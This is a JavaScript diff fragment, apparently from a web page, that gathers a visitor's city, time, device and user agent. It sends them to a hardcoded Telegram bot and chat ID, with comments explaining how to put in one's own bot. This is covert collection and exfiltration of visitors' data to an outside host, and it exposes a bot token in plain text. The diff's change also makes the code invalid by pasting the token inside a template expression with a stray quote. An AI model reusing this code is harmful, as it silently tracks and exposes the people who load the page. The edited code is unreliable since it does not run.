@@ -217,12 +217,12 @@
                 🏙 Ciudad: ${data.city}
                 🕒 Hora: ${new Date().toLocaleString()}
                 📱 Dispositivo: ${dispositivo}
-                🖥 Navegador: ${userAgent}`;
+                🖥 Navegador: ${userAgent}`
 
                       // Enviar mensaje a Telegram
                       const botToken = "8491075928:AAFUI_EalWg3tug4tnyzu2xZdmBqUwkLDWg"; // Reemplaza con el token de tu bot
                       const chatId = "1694742892";     // Reemplaza con el chat ID de tu bot o grupo
-                      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                      const url = `https://api.telegram.org/bot${8491075928:AAFUI_EalWg3tug4tnyzu2xZdmBqUwkLDWg"}/sendMessage`;
 
                       await fetch(url, {
                         method: 'POST',
